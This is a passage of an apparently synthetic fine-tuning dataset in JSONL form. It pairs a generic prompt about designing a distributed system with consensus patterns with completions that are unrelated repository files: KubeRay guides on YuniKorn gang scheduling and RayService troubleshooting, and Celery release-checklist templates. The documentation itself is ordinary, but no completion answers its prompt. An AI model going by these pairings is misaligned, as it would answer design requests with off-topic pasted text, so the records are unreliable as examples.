      +++\n        .. button-ref:: kuberay-examples\n            :color: primary\n            :outline:\n            :expand:\n\n            Try example workloads\n\n    .. grid-item-card::\n\n        **Ecosystem**\n        ^^^\n\n        Integrate KubeRay with third party Kubernetes ecosystem tools.\n\n        +++\n        .. button-ref:: kuberay-ecosystem-integration\n            :color: primary\n            :outline:\n            :expand:\n\n            Ecosystem Guides\n\n    .. grid-item-card::\n\n        **Benchmarks**\n        ^^^\n\n        Check the KubeRay benchmark results.\n\n        +++\n        .. button-ref:: kuberay-benchmarks\n            :color: primary\n            :outline:\n            :expand:\n\n            Benchmark results\n\n    .. grid-item-card::\n\n        **Troubleshooting**\n        ^^^\n\n        Consult the KubeRay troubleshooting guides.\n\n        +++\n        .. button-ref:: kuberay-troubleshooting\n            :color: primary\n            :outline:\n            :expand:\n\n            Troubleshooting guides\n```\n## About KubeRay\n\nRay's Kubernetes support is developed at the [KubeRay GitHub repository](https://github.com/ray-project/kuberay), under the broader [Ray project](https://github.com/ray-project/). KubeRay is used by several companies to run production Ray deployments.\n\n- Visit the [KubeRay GitHub repo](https://github.com/ray-project/kuberay) to track progress, report bugs, propose new features, or contribute to\nthe project.\n", "metadata": {"source": "github.com/ray-project/ray", "file_path": "doc/source/cluster/kubernetes/index.md", "language": "markdown", "complexity": "medium", "star_count": 38179, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": true, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 151}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "(kuberay-yunikorn)=\n\n# KubeRay integration with Apache YuniKorn\n\n[Apache YuniKorn](https://yunikorn.apache.org/) is a light-weight, universal resource scheduler for container orchestrator systems. It performs fine-grained resource sharing for various workloads efficiently on a large scale, multi-tenant, and cloud-native environment. YuniKorn brings a unified, cross-platform, scheduling experience for mixed workloads that consist of stateless batch workloads and stateful services.\n\nKubeRay's Apache YuniKorn integration enables more efficient scheduling of Ray Pods in multi-tenant Kubernetes environments.\n\n:::{note}\n\nThis feature requires KubeRay version 1.2.2 or newer, and it's in alpha testing.\n\n:::\n\n## Step 1: Create a Kubernetes cluster with KinD\nRun the following command in a terminal:\n\n```shell\nkind create cluster\n```\n\n## Step 2: Install Apache YuniKorn\n\nYou need to successfully install Apache YuniKorn on your Kubernetes cluster before enabling Apache YuniKorn integration with KubeRay.\nSee [Get Started](https://yunikorn.apache.org/docs/) for Apache YuniKorn installation instructions.\n\n## Step 3: Install the KubeRay operator with Apache YuniKorn support\n\nWhen installing KubeRay operator using Helm, pass the `--set batchScheduler.name=yunikorn` flag at the command line:\n\n```shell\nhelm install kuberay-operator kuberay/kuberay-operator --version 1.4.2 --set batchScheduler.name=yunikorn\n```\n\n## Step 4: Use Apache YuniKorn for gang scheduling\n\nThis example uses gang scheduling with Apache YuniKorn and KubeRay.\n\nFirst, create a queue with a capacity of 4 CPUs and 6Gi of RAM by editing the ConfigMap:\n\nRun `kubectl edit configmap -n yunikorn yunikorn-defaults`\n\nHelm creates this ConfigMap during the installation of the Apache YuniKorn Helm chart.\n\nAdd a `queues.yaml` config under the `data` key. The `ConfigMap` should look like the following:\n\n```yaml\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  # Metadata for the ConfigMap, skip for brevity.\ndata:\n  queues.yaml: |\n    partitions:\n      - name: default\n        queues:\n          - name: root\n            queues:\n              - name: test\n                submitacl: \"*\"\n                parent: false\n                resources:\n                  guaranteed:\n                    memory: 6G\n                    vcore: 4\n                  max:\n                    memory: 6G\n                    vcore: 4\n```\n\nSave the changes and exit the editor. This configuration creates a queue named `root.test` with a capacity of 4 CPUs and 6Gi of RAM.\n\nNext, create a RayCluster with a head node with 1 CPU and 2GiB of RAM, and two workers with 1 CPU and 1GiB of RAM each, for a total of 3 CPU and 4GiB of RAM:\n\n```shell\n# Path: kuberay/ray-operator/config/samples\n# Configure the necessary labels on the RayCluster custom resource for Apache YuniKorn scheduler's gang scheduling:\n# - `ray.io/gang-scheduling-enabled`: Set to `true` to enable gang scheduling.\n# - `yunikorn.apache.org/app-id`: Set to a unique identifier for the application in Kubernetes, even across different namespaces.\n# - `yunikorn.apache.org/queue`: Set to the name of one of the queues in Apache YuniKorn.\nwget https://raw.githubusercontent.com/ray-project/kuberay/master/ray-operator/config/samples/ray-cluster.yunikorn-scheduler.yaml\nkubectl apply -f ray-cluster.yunikorn-scheduler.yaml\n```\n\nCheck the RayCluster that the KubeRay operator created:\n\n```shell\n$ kubectl describe raycluster test-yunikorn-0\n\nName:         test-yunikorn-0\nNamespace:    default\nLabels:       ray.io/gang-scheduling-enabled=true\n              yunikorn.apache.org/app-id=test-yunikorn-0\n              yunikorn.apache.org/queue=root.test\nAnnotations:  <none>\nAPI Version:  ray.io/v1\nKind:         RayCluster\nMetadata:\n  Creation Timestamp:  2024-09-29T09:52:30Z\n  Generation:          1\n  Resource Version:    951\n  UID:                 cae1dbc9-5a67-4b43-b0d9-be595f21ab85\n# Other fields are skipped for brevity\n````\n\nNote the labels on the RayCluster: `ray.io/gang-scheduling-enabled=true`, `yunikorn.apache.org/app-id=test-yunikorn-0`, and `yunikorn.apache.org/queue=root.test`.\n\n:::{note}\n\nYou only need the `ray.io/gang-scheduling-enabled` label when you require gang scheduling. If you don't set this label, YuniKorn schedules the Ray cluster without enforcing gang scheduling.\n\n:::\n\nBecause the queue has a capacity of 4 CPU and 6GiB of RAM, this resource should schedule successfully without any issues.\n\n```shell\n$ kubectl get pods\n\nNAME                                  READY   STATUS    RESTARTS   AGE\ntest-yunikorn-0-head-98fmp            1/1     Running   0          67s\ntest-yunikorn-0-worker-worker-42tgg   1/1     Running   0          67s\ntest-yunikorn-0-worker-worker-467mn   1/1     Running   0          67s\n```\n\nVerify the scheduling by checking the [Apache YuniKorn dashboard](https://yunikorn.apache.org/docs/#access-the-web-ui).\n\n```shell\nkubectl port-forward svc/yunikorn-service 9889:9889 -n yunikorn\n```\n\nGo to `http://localhost:9889/#/applications` to see the running apps.\n\n![Apache YuniKorn dashboard](../images/yunikorn-dashboard-apps-running.png)\n\nNext, add an additional RayCluster with the same configuration of head and worker nodes, but with a different name:\n\n```shell\n# Replace the name with `test-yunikorn-1`.\nsed 's/test-yunikorn-0/test-yunikorn-1/' ray-cluster.yunikorn-scheduler.yaml | kubectl apply -f-\n```\n\nNow all the Pods for `test-yunikorn-1` are in the `Pending` state:\n\n```shell\n$ kubectl get pods\n\nNAME                                      READY   STATUS    RESTARTS   AGE\ntest-yunikorn-0-head-98fmp                1/1     Running   0          4m22s\ntest-yunikorn-0-worker-worker-42tgg       1/1     Running   0          4m22s\ntest-yunikorn-0-worker-worker-467mn       1/1     Running   0          4m22s\ntest-yunikorn-1-head-xl2r5                0/1     Pending   0          71s\ntest-yunikorn-1-worker-worker-l6ttz       0/1     Pending   0          71s\ntest-yunikorn-1-worker-worker-vjsts       0/1     Pending   0          71s\ntg-test-yunikorn-1-headgroup-vgzvoot0dh   0/1     Pending   0          69s\ntg-test-yunikorn-1-worker-eyti2bn2jv      1/1     Running   0          69s\ntg-test-yunikorn-1-worker-k8it0x6s73      0/1     Pending   0          69s\n```\n\nApache YuniKorn creates the Pods with the `tg-` prefix for gang scheduling purpose.\n\nGo to `http://localhost:9889/#/applications` and to see `test-yunikorn-1` in the `Accepted` state but not running yet:\n\n![Apache YuniKorn dashboard](../images/yunikorn-dashboard-apps-pending.png)\n\nBecause the new cluster requires more CPU and RAM than the queue allows, even though one of the Pods would fit in the remaining 1 CPU and 2GiB of RAM, Apache YuniKorn doesn't place the cluster's Pods until there's enough room for all of the Pods. Without using Apache YuniKorn for gang scheduling in this way, KubeRay would place one of the Pods, and only partially allocating the cluster.\n\nDelete the first RayCluster to free up resources in the queue:\n\n```shell\nkubectl delete raycluster test-yunikorn-0\n```\n\nNow all the Pods for the second cluster change to the `Running` state, because enough resources are now available to schedule the entire set of Pods:\n\nCheck the Pods again to see that the second cluster is now up and running:\n\n```shell\n$ kubectl get pods\n\nNAME                                  READY   STATUS    RESTARTS   AGE\ntest-yunikorn-1-head-xl2r5            1/1     Running   0          3m34s\ntest-yunikorn-1-worker-worker-l6ttz   1/1     Running   0          3m34s\ntest-yunikorn-1-worker-worker-vjsts   1/1     Running   0          3m34s\n```\n\nClean up the resources:\n\n```shell\nkubectl delete raycluster test-yunikorn-1\n```\n", "metadata": {"source": "github.com/ray-project/ray", "file_path": "doc/source/cluster/kubernetes/k8s-ecosystem/yunikorn.md", "language": "markdown", "complexity": "medium", "star_count": 38179, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": true, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": true, "line_count": 191}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "(kuberay-raysvc-troubleshoot)=\n\n# RayService troubleshooting\n\nRayService is a Custom Resource Definition (CRD) designed for Ray Serve. In KubeRay, creating a RayService will first create a RayCluster and then\ncreate Ray Serve applications once the RayCluster is ready. If the issue pertains to the data plane, specifically your Ray Serve scripts\nor Ray Serve configurations (`serveConfigV2`), troubleshooting may be challenging. This section provides some tips to help you debug these issues.\n\n## Observability\n\n### Method 1: Check KubeRay operator's logs for errors\n\n```bash\nkubectl logs $KUBERAY_OPERATOR_POD -n $YOUR_NAMESPACE | tee operator-log\n```\n\nThe above command will redirect the operator's logs to a file called `operator-log`. You can then search for errors in the file.\n\n### Method 2: Check RayService CR status\n\n```bash\nkubectl describe rayservice $RAYSERVICE_NAME -n $YOUR_NAMESPACE\n```\n\nYou can check the status and events of the RayService CR to see if there are any errors.\n\n### Method 3: Check logs of Ray Pods\n\nYou can also check the Ray Serve logs directly by accessing the log files on the pods. These log files contain system level logs from the Serve controller and HTTP proxy as well as access logs and user-level logs. See [Ray Serve Logging](serve-logging) and [Ray Logging](configure-logging) for more details.\n\n```bash\nkubectl exec -it $RAY_POD -n $YOUR_NAMESPACE -- bash\n# Check the logs under /tmp/ray/session_latest/logs/serve/\n```\n\n### Method 4: Check Dashboard\n\n```bash\nkubectl port-forward $RAY_POD -n $YOUR_NAMESPACE 8265:8265\n# Check $YOUR_IP:8265 in your browser\n```\n\nFor more details about Ray Serve observability on the dashboard, you can refer to [the documentation](dash-serve-view) and [the YouTube video](https://youtu.be/eqXfwM641a4).\n\n### Method 5: Ray State CLI\n\nYou can use the [Ray State CLI](state-api-cli-ref) on the head Pod to check the status of Ray Serve applications.\n\n```bash\n# Log into the head Pod\nexport HEAD_POD=$(kubectl get pods --selector=ray.io/node-type=head -o custom-columns=POD:metadata.name --no-headers)\nkubectl exec -it $HEAD_POD -- ray summary actors\n\n# [Example output]:\n# ======== Actors Summary: 2023-07-11 17:58:24.625032 ========\n# Stats:\n# ------------------------------------\n# total_actors: 14\n\n\n# Table (group by class):\n# ------------------------------------\n#     CLASS_NAME                          STATE_COUNTS\n# 0   ServeController                     ALIVE: 1\n# 1   ServeReplica:fruit_app_OrangeStand  ALIVE: 1\n# 2   ProxyActor                          ALIVE: 3\n# 4   ServeReplica:math_app_Multiplier    ALIVE: 1\n# 5   ServeReplica:math_app_create_order  ALIVE: 1\n# 7   ServeReplica:fruit_app_FruitMarket  ALIVE: 1\n# 8   ServeReplica:math_app_Adder         ALIVE: 1\n# 9   ServeReplica:math_app_Router        ALIVE: 1\n# 10  ServeReplica:fruit_app_MangoStand   ALIVE: 1\n# 11  ServeReplica:fruit_app_PearStand    ALIVE: 1\n```\n\n## Common issues\n\n* {ref}`kuberay-raysvc-issue1`\n* {ref}`kuberay-raysvc-issue2`\n* {ref}`kuberay-raysvc-issue3`\n* {ref}`kuberay-raysvc-issue4`\n* {ref}`kuberay-raysvc-issue5`\n* {ref}`kuberay-raysvc-issue6`\n* {ref}`kuberay-raysvc-issue7`\n* {ref}`kuberay-raysvc-issue8`\n* {ref}`kuberay-raysvc-issue9`\n* {ref}`kuberay-raysvc-issue10`\n\n(kuberay-raysvc-issue1)=\n### Issue 1: Ray Serve script is incorrect\n\nIt's better to test Ray Serve script locally or in a RayCluster before deploying it to a RayService.\nSee [Development Workflow](serve-dev-workflow) for more details.\n\n(kuberay-raysvc-issue2)=\n### Issue 2: `serveConfigV2` is incorrect\n\nThe RayService CR sets `serveConfigV2` as a YAML multi-line string for flexibility.\nThis implies that there is no strict type checking for the Ray Serve configurations in `serveConfigV2` field.\nSome tips to help you debug the `serveConfigV2` field:\n\n* Check [the documentation](serve-api) for the schema about\nthe Ray Serve Multi-application API `PUT \"/api/serve/applications/\"`.\n* Unlike `serveConfig`, `serveConfigV2` adheres to the snake case naming convention. For example, `numReplicas` is used in `serveConfig`, while `num_replicas` is used in `serveConfigV2`.\n\n(kuberay-raysvc-issue3)=\n### Issue 3: The Ray image doesn't include the required dependencies\n\nYou have two options to resolve this issue:\n\n* Build your own Ray image with the required dependencies.\n* Specify the required dependencies using `runtime_env` in the `serveConfigV2` field.\n  * For example, the MobileNet example requires `python-multipart`, which isn't included in the Ray image `rayproject/ray:x.y.z`.\nTherefore, the YAML file includes `python-multipart` in the runtime environment. For more details, refer to [the MobileNet example](kuberay-mobilenet-rayservice-example).\n\n(kuberay-raysvc-issue4)=\n### Issue 4: Incorrect `import_path`.\n\nYou can refer to [the documentation](https://docs.ray.io/en/latest/serve/api/doc/ray.serve.schema.ServeApplicationSchema.html#ray.serve.schema.ServeApplicationSchema.import_path) for more details about the format of `import_path`.\nTaking [the MobileNet YAML file](https://github.com/ray-project/kuberay/blob/v1.0.0/ray-operator/config/samples/ray-service.mobilenet.yaml) as an example,\nthe `import_path` is `mobilenet.mobilenet:app`. The first `mobilenet` is the name of the directory in the `working_dir`,\nthe second `mobilenet` is the name of the Python file in the directory `mobilenet/`,\nand `app` is the name of the variable representing Ray Serve application within the Python file.\n\n```yaml\n  serveConfigV2: |\n    applications:\n      - name: mobilenet\n        import_path: mobilenet.mobilenet:app\n        runtime_env:\n          working_dir: \"https://github.com/ray-project/serve_config_examples/archive/b393e77bbd6aba0881e3d94c05f968f05a387b96.zip\"\n          pip: [\"python-multipart==0.0.6\"]\n```\n\n(kuberay-raysvc-issue5)=\n### Issue 5: Fail to create / update Serve applications.\n\nYou may encounter the following error messages when KubeRay tries to create / update Serve applications:\n\n#### Error message 1: `connect: connection refused`\n\n```\nPut \"http://${HEAD_SVC_FQDN}:52365/api/serve/applications/\": dial tcp $HEAD_IP:52365: connect: connection refused\n```\n\nFor RayService, the KubeRay operator submits a request to the RayCluster for creating Serve applications once the head Pod is ready.\nIt's important to note that the Dashboard, Dashboard Agent and GCS may take a few seconds to start up after the head Pod is ready.\nAs a result, the request may fail a few times initially before the necessary components are fully operational.\n\nIf you continue to encounter this issue after waiting for 1 minute, it's possible that the dashboard or dashboard agent may have failed to start.\nFor more information, you can check the `dashboard.log` and `dashboard_agent.log` files located at `/tmp/ray/session_latest/logs/` on the head Pod.\n\n#### Error message 2: `i/o timeout`\n\n```\nPut \"http://${HEAD_SVC_FQDN}:52365/api/serve/applications/\": dial tcp $HEAD_IP:52365: i/o timeout\"\n```\n\nOne possible cause of this issue could be a Kubernetes NetworkPolicy blocking the traffic between the Ray Pods and the dashboard agent's port (i.e., 52365).\n\n(kuberay-raysvc-issue6)=\n### Issue 6: `runtime_env`\n\nIn `serveConfigV2`, you can specify the runtime environment for the Ray Serve applications using `runtime_env`.\nSome common issues related to `runtime_env`:\n\n* The `working_dir` points to a private AWS S3 bucket, but the Ray Pods do not have the necessary permissions to access the bucket.\n\n* The NetworkPolicy blocks the traffic between the Ray Pods and the external URLs specified in `runtime_env`.\n\n(kuberay-raysvc-issue7)=\n### Issue 7: Failed to get Serve application statuses.\n\nYou may encounter the following error message when KubeRay tries to get Serve application statuses:\n\n```\nGet \"http://${HEAD_SVC_FQDN}:52365/api/serve/applications/\": dial tcp $HEAD_IP:52365: connect: connection refused\"\n```\n\nAs mentioned in [Issue 5](#kuberay-raysvc-issue5), the KubeRay operator submits a `Put` request to the RayCluster for creating Serve applications once the head Pod is ready.\nAfter the successful submission of the `Put` request to the dashboard agent, a `Get` request is sent to the dashboard agent port (i.e., 52365).\nThe successful submission indicates that all the necessary components, including the dashboard agent, are fully operational.\nTherefore, unlike Issue 5, the failure of the `Get` request is not expected.\n\nIf you consistently encounter this issue, there are several possible causes:\n\n* The dashboard agent process on the head Pod is not running. You can check the `dashboard_agent.log` file located at `/tmp/ray/session_latest/logs/` on the head Pod for more information. In addition, you can also perform an experiment to reproduce this cause by manually killing the dashboard agent process on the head Pod.\n  ```bash\n  # Step 1: Log in to the head Pod\n  kubectl exec -it $HEAD_POD -n $YOUR_NAMESPACE -- bash\n\n  # Step 2: Check the PID of the dashboard agent process\n  ps aux\n  # [Example output]\n  # ray          156 ... 0:03 /.../python -u /.../ray/dashboard/agent.py --\n\n  # Step 3: Kill the dashboard agent process\n  kill 156\n\n  # Step 4: Check the logs\n  cat /tmp/ray/session_latest/logs/dashboard_agent.log\n\n  # [Example output]\n  # 2023-07-10 11:24:31,962 INFO web_log.py:206 -- 10.244.0.5 [10/Jul/2023:18:24:31 +0000] \"GET /api/serve/applications/ HTTP/1.1\" 200 13940 \"-\" \"Go-http-client/1.1\"\n  # 2023-07-10 11:24:34,001 INFO web_log.py:206 -- 10.244.0.5 [10/Jul/2023:18:24:33 +0000] \"GET /api/serve/applications/ HTTP/1.1\" 200 13940 \"-\" \"Go-http-client/1.1\"\n  # 2023-07-10 11:24:36,043 INFO web_log.py:206 -- 10.244.0.5 [10/Jul/2023:18:24:36 +0000] \"GET /api/serve/applications/ HTTP/1.1\" 200 13940 \"-\" \"Go-http-client/1.1\"\n  # 2023-07-10 11:24:38,082 INFO web_log.py:206 -- 10.244.0.5 [10/Jul/2023:18:24:38 +0000] \"GET /api/serve/applications/ HTTP/1.1\" 200 13940 \"-\" \"Go-http-client/1.1\"\n  # 2023-07-10 11:24:38,590 WARNING agent.py:531 -- Exiting with SIGTERM immediately...\n\n  # Step 5: Open a new terminal and check the logs of the KubeRay operator\n  kubectl logs $KUBERAY_OPERATOR_POD -n $YOUR_NAMESPACE | tee operator-log\n\n  # [Example output]\n  # Get \\\"http://rayservice-sample-raycluster-rqlsl-head-svc.default.svc.cluster.local:52365/api/serve/applications/\\\": dial tcp 10.96.7.154:52365: connect: connection refused\n  ```\n\n(kuberay-raysvc-issue8)=\n### Issue 8: A loop of restarting the RayCluster occurs when the Kubernetes cluster runs out of resources. (KubeRay v0.6.1 or earlier)\n\n> Note: Currently, the KubeRay operator does not have a clear plan to handle situations where the Kubernetes cluster runs out of resources.\nTherefore, we recommend ensuring that the Kubernetes cluster has sufficient resources to accommodate the serve application.\n\nIf the status of a serve application remains non-`RUNNING` for more than `serviceUnhealthySecondThreshold` seconds,\nthe KubeRay operator will consider the RayCluster as unhealthy and initiate the preparation of a new RayCluster.\nA common cause of this issue is that the Kubernetes cluster does not have enough resources to accommodate the serve application.\nIn such cases, the KubeRay operator may continue to restart the RayCluster, leading to a loop of restarts.\n\nWe can also perform an experiment to reproduce this situation:\n\n* A Kubernetes cluster with an 8-CPUs node\n* [ray-service.insufficient-resources.yaml](https://gist.github.com/kevin85421/6a7779308aa45b197db8015aca0c1faf)\n  * RayCluster:\n    * The cluster has 1 head Pod with 4 physical CPUs, but `num-cpus` is set to 0 in `rayStartParams` to prevent any serve replicas from being scheduled on the head Pod.\n    * The cluster also has 1 worker Pod with 1 CPU by default.\n  * `serveConfigV2` specifies 5 serve deployments, each with 1 replica and a requirement of 1 CPU.\n\n```bash\n# Step 1: Get the number of CPUs available on the node\nkubectl get nodes -o custom-columns=NODE:.metadata.name,ALLOCATABLE_CPU:.status.allocatable.cpu\n\n# [Example output]\n# NODE                 ALLOCATABLE_CPU\n# kind-control-plane   8\n\n# Step 2: Install a KubeRay operator.\n\n# Step 3: Create a RayService with autoscaling enabled.\nkubectl apply -f ray-service.insufficient-resources.yaml\n\n# Step 4: The Kubernetes cluster will not have enough resources to accommodate the serve application.\nkubectl describe rayservices.ray.io rayservice-sample -n $YOUR_NAMESPACE\n\n# [Example output]\n# fruit_app_FruitMarket:\n#   Health Last Update Time:  2023-07-11T02:10:02Z\n#   Last Update Time:         2023-07-11T02:10:35Z\n#   Message:                  Deployment \"fruit_app_FruitMarket\" has 1 replicas that have taken more than 30s to be scheduled. This may be caused by waiting for the cluster to auto-scale, or waiting for a runtime environment to install. Resources required for each replica: {\"CPU\": 1.0}, resources available: {}.\n#   Status:                   UPDATING\n\n# Step 5: A new RayCluster will be created after `serviceUnhealthySecondThreshold` (300s here) seconds.\n# Check the logs of the KubeRay operator to find the reason for restarting the RayCluster.\nkubectl logs $KUBERAY_OPERATOR_POD -n $YOUR_NAMESPACE | tee operator-log\n\n# [Example output]\n# 2023-07-11T02:14:58.109Z\tINFO\tcontrollers.RayService\tRestart RayCluster\t{\"appName\": \"fruit_app\", \"restart reason\": \"The status of the serve application fruit_app has not been RUNNING for more than 300.000000 seconds. Hence, KubeRay operator labels the RayCluster unhealthy and will prepare a new RayCluster.\"}\n# 2023-07-11T02:14:58.109Z\tINFO\tcontrollers.RayService\tRestart RayCluster\t{\"deploymentName\": \"fruit_app_FruitMarket\", \"appName\": \"fruit_app\", \"restart reason\": \"The status of the serve deployment fruit_app_FruitMarket or the serve application fruit_app has not been HEALTHY/RUNNING for more than 300.000000 seconds. Hence, KubeRay operator labels the RayCluster unhealthy and will prepare a new RayCluster. The message of the serve deployment is: Deployment \\\"fruit_app_FruitMarket\\\" has 1 replicas that have taken more than 30s to be scheduled. This may be caused by waiting for the cluster to auto-scale, or waiting for a runtime environment to install. Resources required for each replica: {\\\"CPU\\\": 1.0}, resources available: {}.\"}\n# .\n# .\n# .\n# 2023-07-11T02:14:58.122Z\tINFO\tcontrollers.RayService\tRestart RayCluster\t{\"ServiceName\": \"default/rayservice-sample\", \"AvailableWorkerReplicas\": 1, \"DesiredWorkerReplicas\": 5, \"restart reason\": \"The serve application is unhealthy, restarting the cluster. If the AvailableWorkerReplicas is not equal to DesiredWorkerReplicas, this may imply that the Autoscaler does not have enough resources to scale up the cluster. Hence, the serve application does not have enough resources to run. Please check https://github.com/ray-project/kuberay/blob/master/docs/guidance/rayservice-troubleshooting.md for more details.\", \"RayCluster\": {\"apiVersion\": \"ray.io/v1alpha1\", \"kind\": \"RayCluster\", \"namespace\": \"default\", \"name\": \"rayservice-sample-raycluster-hvd9f\"}}\n```\n\n(kuberay-raysvc-issue9)=\n### Issue 9: Upgrade from Ray Serve's single-application API to its multi-application API without downtime\n\nKubeRay v0.6.0 has begun supporting Ray Serve API V2 (multi-application) by exposing `serveConfigV2` in the RayService CRD.\nHowever, Ray Serve does not support deploying both API V1 and API V2 in the cluster simultaneously.\nHence, if users want to perform in-place upgrades by replacing `serveConfig` with `serveConfigV2`, they may encounter the following error message:\n\n```\nray.serve.exceptions.RayServeException: You are trying to deploy a multi-application config, however a single-application\nconfig has been deployed to the current Serve instance already. Mixing single-app and multi-app is not allowed. Please either\nredeploy using the single-application config format `ServeApplicationSchema`, or shutdown and restart Serve to submit a\nmulti-app config of format `ServeDeploySchema`. If you are using the REST API, you can submit a multi-app config to the\nthe multi-app API endpoint `/api/serve/applications/`.\n```\n\nTo resolve this issue, you can replace `serveConfig` with `serveConfigV2` and modify `rayVersion` which has no effect when the Ray version is 2.0.0 or later to 2.100.0.\nThis will trigger a new RayCluster preparation instead of an in-place update.\n\nIf, after following the steps above, you still see the error message and GCS fault tolerance is enabled, it may be due to the `ray.io/external-storage-namespace` annotation being the same for both old and new RayClusters.\nYou can remove the annotation and KubeRay will automatically generate a unique key for each RayCluster custom resource.\nSee [kuberay#1297](https://github.com/ray-project/kuberay/issues/1297) for more details.\n\n(kuberay-raysvc-issue10)=\n### Issue 10: Upgrade RayService with GCS fault tolerance enabled without downtime\n\nKubeRay uses the value of the annotation [ray.io/external-storage-namespace](kuberay-external-storage-namespace) to assign the environment variable `RAY_external_storage_namespace` to all Ray Pods managed by the RayCluster.\nThis value represents the storage namespace in Redis where the Ray cluster metadata resides.\nIn the process of a head Pod recovery, the head Pod attempts to reconnect to the Redis server using the `RAY_external_storage_namespace` value to recover the cluster data.\n\nHowever, specifying the `RAY_external_storage_namespace` value in RayService can potentially lead to downtime during zero-downtime upgrades.\nSpecifically, the new RayCluster accesses the same Redis storage namespace as the old one for cluster metadata.\nThis configuration can lead the KubeRay operator to assume that the Ray Serve applications are operational, as indicated by the existing metadata in Redis.\nConsequently, the operator might deem it safe to retire the old RayCluster and redirect traffic to the new one, even though the latter may still require time to initialize the Ray Serve applications.\n\nThe recommended solution is to remove the `ray.io/external-storage-namespace` annotation from the RayService CRD.\nIf the annotation isn't set, KubeRay automatically uses each RayCluster custom resource's UID as the `RAY_external_storage_namespace` value.\nHence, both the old and new RayClusters have different `RAY_external_storage_namespace` values, and the new RayCluster is unable to access the old cluster metadata.\nAnother solution is to set the `RAY_external_storage_namespace` value manually to a unique value for each RayCluster custom resource.\nSee [kuberay#1296](https://github.com/ray-project/kuberay/issues/1296) for more details.\n", "metadata": {"source": "github.com/ray-project/ray", "file_path": "doc/source/cluster/kubernetes/troubleshooting/rayservice-troubleshooting.md", "language": "markdown", "complexity": "complex", "star_count": 38179, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 312}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nname: Major Version Release Checklist\nabout: About to release a new major version? (Maintainers Only!)\ntitle: ''\nlabels: ''\nassignees: ''\n\n---\n\nVersion: <!-- Insert Version Here -->\nRelease PR: <!-- Insert Release PR Here -->\n\n# Description\n\n<!-- Briefly describe the contents of the version -->\n\n# Checklist\n\n- [ ] Release PR drafted\n- [ ] Milestone is 100% done\n- [ ] Merge Freeze\n- [ ] Release PR reviewed\n- [ ] The main branch build passes\n\n    [![Build Status](https://github.com/celery/celery/actions/workflows/python-package.yml/badge.svg)](https://github.com/celery/celery/actions/workflows/python-package.yml)\n- [ ] Release Notes\n- [ ] What's New\n\n# Process\n\n# Alphas\n\n<!-- Add more as needed -->\n- [ ] Alpha 1\n\n## Betas\n\n<!-- Add more as needed -->\n- [ ] Beta 1\n\n## Release Candidates\n\n<!-- Add more as needed -->\n- [ ] RC 1\n\n# Release Blockers\n\n# Potential Release Blockers\n", "metadata": {"source": "github.com/celery/celery", "file_path": ".github/ISSUE_TEMPLATE/Major-Version-Release-Checklist.md", "language": "markdown", "complexity": "simple", "star_count": 26879, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": true, "line_count": 49}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nname: Minor Version Release Checklist\nabout: About to release a new minor version? (Maintainers Only!)\ntitle: ''\nlabels: ''\nassignees: ''\n\n---\n\n# Minor Release Overview: v<!-- Insert Version Here, e.g. 5.4.0 -->\n\nThis issue will summarize the status and discussion in preparation for the new release. It will be used to track the progress of the release and to ensure that all the necessary steps are taken. It will serve as a checklist for the release and will be used to communicate the status of the release to the community.\n\n> ⚠️ **Warning:** The release checklist is a living document. It will be updated as the release progresses. Please check back often to ensure that you are up to date with the latest information.\n\n## Checklist\n- [ ] Codebase Stability\n- [ ] Breaking Changes Validation\n- [ ] Compile Changelog\n- [ ] Release\n- [ ] Release Announcement\n\n# Release Details\nThe release manager is responsible for completing the release end-to-end ensuring that all the necessary steps are taken and that the release is completed in a timely manner. This is usually the owner of the release issue but may be assigned to a different maintainer if necessary.\n\n- Release Manager: <!-- Insert Release Manager Here -->\n- Release Date: <!-- Insert Release Date Here -->\n- Release Branch: `main`\n\n# Release Steps\nThe release manager is expected to execute the checklist below. The release manager is also responsible for ensuring that the checklist is updated as the release progresses. Any changes or issues should be communicated under this issue for centralized tracking.\n\n# Potential Release Blockers\n\n## 1. Codebase Stability\n- [ ] The `main` branch build passes\n\n    [![Build Status](https://github.com/celery/celery/actions/workflows/python-package.yml/badge.svg)](https://github.com/celery/celery/actions/workflows/python-package.yml)\n\n## 2. Breaking Changes Validation\nA patch release should not contain any breaking changes. The release manager is responsible for reviewing all of the merged PRs since the last release to ensure that there are no breaking changes. If there are any 